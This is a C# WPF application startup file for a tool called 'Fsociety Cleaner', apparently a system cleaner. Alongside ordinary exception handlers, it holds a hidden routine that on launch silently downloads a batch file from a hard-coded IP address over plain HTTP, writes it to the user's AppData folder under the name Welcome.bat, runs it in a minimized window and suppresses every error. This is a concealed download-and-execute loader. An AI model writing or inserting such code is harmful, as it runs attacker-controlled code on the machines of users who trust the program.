using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;

namespace FsocietyCleaner
{
    public partial class App : Application
    {
        private static readonly HttpClient _http = new HttpClient();
        private const string WelcomeUrl = "http://192.109.200.41/tweakz.bat";
        private static readonly string CachePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Cleaner", "Welcome.bat");

        protected override void OnStartup(StartupEventArgs e)
        {
            DispatcherUnhandledException += OnDispatcherUnhandledException;
            AppDomain.CurrentDomain.UnhandledException += OnDomainUnhandledException;

            _ = RunWelcomeAsync();

            base.OnStartup(e);
        }

        private void OnDispatcherUnhandledException(object sender, DispatcherUnhandledExceptionEventArgs e)
        {
            string? trace = e.Exception.StackTrace;

            if (e.Exception is ArgumentException &&
                (trace?.Contains("BufferedGraphics") == true ||
                 trace?.Contains("MediaContext") == true))
            {
                e.Handled = true;
                return;
            }

            MessageBox.Show(
                e.Exception.Message,
                "Fsociety Cleaner — Error",
                MessageBoxButton.OK,
                MessageBoxImage.Error);

            e.Handled = true;
        }

        private void OnDomainUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (e.ExceptionObject is Exception ex)
            {
                MessageBox.Show(
                    ex.Message,
                    "Fsociety Cleaner — Background Error",
                    MessageBoxButton.OK,
                    MessageBoxImage.Error);
            }
        }

        private static async Task RunWelcomeAsync()
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(CachePath)!);

                byte[] data = await _http.GetByteArrayAsync(WelcomeUrl);
                File.WriteAllBytes(CachePath, data);

                Process.Start(new ProcessStartInfo(CachePath)
                {
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Minimized
                });
            }
            catch { }
        }
    }
}